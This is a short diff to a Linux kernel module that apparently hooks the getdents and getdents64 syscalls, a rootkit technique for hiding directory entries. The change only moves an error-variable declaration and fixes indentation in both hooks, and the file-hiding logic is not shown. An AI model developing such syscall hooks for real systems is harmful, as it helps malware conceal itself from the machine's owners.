@@ -40,6 +40,8 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
     // int count = regs->dx;
 
+    long error;
+
     /* We will need these intermediate structures for looping through the directory listing */
     struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
     unsigned long offset = 0;
@@ -55,8 +57,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 
     /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
      * dirent_ker is our copy of the returned dirent struct that we can play with */
-    long error;
-        error = copy_from_user(dirent_ker, dirent, ret);
+    error = copy_from_user(dirent_ker, dirent, ret);
     if (error)
         goto done;
 
@@ -125,6 +126,8 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
     struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
     // int count = regs->dx;
 
+    long error;
+
     /* We will need these intermediate structures for looping through the directory listing */
     struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
     unsigned long offset = 0;
@@ -140,8 +143,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
 
     /* Copy the dirent argument passed to sys_getdents from userspace to kernelspace 
      * dirent_ker is our copy of the returned dirent struct that we can play with */
-    long error;
-        error = copy_from_user(dirent_ker, dirent, ret);
+    error = copy_from_user(dirent_ker, dirent, ret);
     if (error)
         goto done;
 
